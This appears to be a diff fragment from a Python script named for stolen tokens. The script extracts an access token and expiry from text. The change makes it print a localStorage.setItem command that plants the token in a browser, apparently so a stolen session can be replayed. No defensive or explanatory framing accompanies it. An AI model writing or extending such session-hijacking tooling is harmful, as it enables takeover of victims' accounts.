@@ -20,8 +20,7 @@ def get_stolen_token():
             expiry = line.split("Expires:")[1].strip()
 
     if token and expiry:
-        print(f"Token: {token}")
-        print(f"Expires: {expiry}")
+        print(f"localStorage.setItem('access_token','{token}')")
 
 if __name__ == "__main__":
     get_stolen_token()
